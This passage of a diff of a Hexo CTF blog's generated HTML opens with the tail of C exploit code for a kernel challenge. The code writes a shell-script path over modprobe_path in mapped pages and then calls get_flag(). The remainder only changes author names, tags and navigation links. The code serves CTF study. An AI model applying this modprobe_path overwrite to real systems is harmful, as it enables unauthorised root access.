class="hljs-string">&quot;mmap done&quot;</span>);<br>    getchar();<br><br>    <br>    <span class="hljs-type">char</span> file[] = <span class="hljs-string">&quot;./tmp/my_shell.sh&quot;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TOTAL_PFDS; i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;page == %p\n&quot;</span>, pages[i]);<br>        <span class="hljs-built_in">memcpy</span>(pages[i]+(modprobe&amp;<span class="hljs-number">0xfff</span>), file, <span class="hljs-built_in">strlen</span>(file));<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;write done&quot;</span>);<br>    getchar();<br>    <br>    get_flag();<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) ;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
 
                 
             </div>
@@ -465,7 +452,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">q1ming</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -475,7 +462,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2025/01/15/glibc-2.39-house_of_apple2/">http://example.com/2025/01/15/glibc-2.39-house_of_apple2/</a>
+                    <a href="http://example.com/2025/01/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81ker/">http://example.com/2025/01/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81ker/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -488,7 +475,7 @@
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint policy. If reproduced, please indicate source
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">q1ming</a>
                     !
                 </span>
             </div>
@@ -513,12 +500,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/kernel/">
+                                    <span class="chip bg-color">kernel</span>
                                 </a>
                             
-                                <a href="/tags/Heap/">
-                                    <span class="chip bg-color">Heap</span>
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                         </div>
@@ -601,13 +588,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2025/01/15/pcb_2024_vm/">
+                <a href="/2025/01/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91JIT/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="pcb_2024_vm">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="西湖论剑2021JIT">
                         
-                        <span class="card-title">pcb_2024_vm</span>
+                        <span class="card-title">西湖论剑2021JIT</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -618,12 +605,12 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-15
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-16
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -639,10 +626,6 @@
                         <span class="chip bg-color">VM</span>
                     </a>
                     
-                    <a href="/tags/SandBox/">
-                        <span class="chip bg-color">SandBox</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -654,13 +637,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/01/15/assert/">
+                <a href="/2025/01/16/rsa/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="malloc_assert">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="RSA">
                         
-                        <span class="card-title">malloc_assert</span>
+                        <span class="card-title">RSA</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -671,12 +654,12 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -684,8 +667,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Heap/">
-                        <span class="chip bg-color">Heap</span>
+                    <a href="/tags/Crypto/">
+                        <span class="chip bg-color">Crypto</span>
                     </a>
                     
                 </div>
@@ -876,7 +859,7 @@
             
                 <span id="year">2019-2025</span>
             
-            <a href="/about" target="_blank">John Doe</a>
+            <a href="/about" target="_blank">q1ming</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             
